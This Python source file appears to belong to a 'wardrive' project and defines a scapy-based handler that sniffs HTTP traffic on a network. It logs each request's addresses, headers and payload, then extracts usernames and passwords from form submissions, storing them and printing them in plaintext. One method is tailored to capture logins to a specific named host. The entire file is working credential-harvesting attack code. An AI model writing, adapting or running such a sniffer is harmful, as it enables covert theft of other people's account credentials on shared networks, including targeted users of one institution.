from scapy.all import *
from utils.http_fields import username_fields, password_fields
from scapy_http import http
from datetime import datetime, timezone
from wardrive.models import HTTPRequest, HTTPCredential
import re
import traceback

class HTTPHandler(object):

    def __init__(self):
        pass

    def handle_http_fatecsan_credential(self, pkt, now=None):
        if not now:
            now = datetime.now(timezone.utc)
        raw = ' '.join(pkt.sprintf("%Raw.load%").split())
        destination_address = str(pkt[IP].dst)
        userRE = re.findall('name="userid".*?(\d+).*?------', raw, re.M |
                                re.S)
        if userRE:
            username = str(userRE[0].replace('%40', '@')).replace('\\r\\n',
                                                                  '')
            passwdRE = re.findall('name="password"(.*?)------', raw,
                                  re.M | re.S)
            if passwdRE:
                passwd = str(passwdRE[0]).replace('\\r\\n', '')

                hc = HTTPCredential()
                hc.destination_address = str(pkt[IP].dst)
                hc.detection_time = now
                hc.username = username
                hc.password = passwd
                hc.host = pkt[http.HTTP].Host
                hc.path = pkt[http.HTTP].Path

                try:
                    hc.authorization = pkt[http.HTTP].Authorization
                except:
                    pass

                hc.save()
                print('HTTP CREDENTIAL {} {} -> {}'.format(hc.host,
                                                           hc.username,
                                                           hc.password))

    def handle_http_credential(self, pkt, now=None):
        if not now:
            now = datetime.now(timezone.utc)
        raw = ' '.join(pkt.sprintf("%Raw.load%").split())
        destination_address = str(pkt[IP].dst)
        for usrfield in username_fields:
            userRE = re.findall(str(usrfield) + '=(.*?)(&|$)', raw)
            if userRE:
                username = userRE[0][0].replace('%40', '@').replace('+', ' ')
                for pwdfield in password_fields:
                    passwdRE = re.findall(str(pwdfield) + '=(.*?)(&|$)', raw)
                    if passwdRE:
                        passwd = passwdRE[0][0]

                        hc = HTTPCredential()
                        hc.destination_address = str(pkt[IP].dst)
                        hc.detection_time = now
                        hc.username = username
                        hc.password = passwd
                        hc.host = pkt[http.HTTP].Host
                        hc.path = pkt[http.HTTP].Path

                        try:
                            hc.authorization = pkt[http.HTTP].Authorization
                        except:
                            pass

                        hc.save()
                        print('HTTP CREDENTIAL {} {} -> {}'.format(hc.host,
                                                                   hc.username,
                                                                   hc.password))
                        break
                break

    def handle(self, pkt):
        if pkt.haslayer(http.HTTP):
            now = datetime.now(timezone.utc)
            source_address = str(pkt[IP].src)
            destination_address = str(pkt[IP].dst)

            try:
                if pkt[http.HTTP].Method:
                    direction = 'REQUEST'
                else:
                    direction = 'RESPONSE'
            except:
                direction = 'RESPONSE'

            r = HTTPRequest()
            r.source_address = source_address
            r.destination_address = destination_address
            r.source_mac_address = pkt[Ether].src
            r.destination_mac_address = pkt[Ether].dst
            r.detection_time = now
            r.direction = direction
            r.payload = pkt[Raw].load

            try:
                try:
                    contenttype = http._get_field_value(pkt[http.HTTP],
                                                        'Content-Type').decode()
                except AttributeError:
                    contenttype = ''
                if 'octet-stream' in contenttype:
                    return
                else:
                    valid = False
                    for method in ['POST', 'GET', 'PUT', 'DELETE', 'HEAD']:
                        try:
                            if method in pkt[http.HTTP].Method.decode():
                                valid = True
                                break
                        except AttributeError:
                            continue
                    if not valid:
                        return
                    raw = ' '.join(pkt.sprintf("%Raw.load%").split())

                    if direction == 'REQUEST':
                        try:
                            useragent = http._get_field_value(pkt[http.HTTP],'User-Agent')
                        except AttributeError:
                            useragent = ''
                        r.user_agent = useragent
                        
                        try:
                            method = pkt[http.HTTP].Method
                        except AttributeError:
                            method = ''
                        r.method = method

                        try:
                            host = pkt[http.HTTP].Host
                        except AttributeError:
                            host = ''
                        r.host = host

                        try:
                            path = pkt[http.HTTP].Path
                        except AttributeError:
                            path = ''
                        r.path = path

                        r.status_code = 0

                    elif direction == 'RESPONSE':
                        try:
                            server = pkt[http.HTTP].Server
                        except AttributeError:
                            server = ''
                        r.server = server

                        try:
                            statuscode = http._get_field_value(pkt[http.HTTP],'Status-Line').split()[1]
                        except (AttributeError, IndexError):
                            statuscode = 0
                        r.status_code = statuscode

                    try:
                        headers = pkt[http.HTTP].Headers
                    except AttributeError:
                        headers = ''
                    r.headers = headers

                    r.save()


                    if 'san.fatecsp.br'.encode() in r.host:
                        self.handle_http_fatecsan_credential(pkt, now)
                    elif r.method.decode() in ['POST', 'GET', 'PUT', 'DELETE']:
                        self.handle_http_credential(pkt, now)

            except:
                traceback.print_exc()

